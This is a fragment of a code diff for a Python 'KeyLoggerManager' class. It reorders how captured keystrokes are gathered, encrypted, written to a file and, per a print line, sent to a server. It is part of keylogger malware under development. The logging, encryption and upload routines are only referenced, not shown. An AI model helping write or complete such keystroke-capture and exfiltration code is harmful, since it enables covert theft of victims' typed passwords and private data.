@@ -20,15 +20,16 @@ class KeyLoggerManager:
         file_maker.write_data(self.data)
     
     def encrypt(self):  
+        self.data = self.logger.get_logged_keys()
+
         self.data = encryption.Encryptor(self.key, self.data)
-        self.data = self.data.encrypt()    
+        self.data = self.data.encrypt()  
     def stop(self):
         self.logger.stop_logging()
-        self.data = self.logger.get_logged_keys()
+        
     #these prints are just for testing and will be deleted after testing    
     def run(self):
-        print("process started")
-        self.start()
+        
         print("logging started")
         time.sleep(self.clock)
         self.stop()
@@ -46,7 +47,6 @@ class KeyLoggerManager:
         print("data sent to server")
         
         print("process complete")
-    
 """
 manages the program
 """
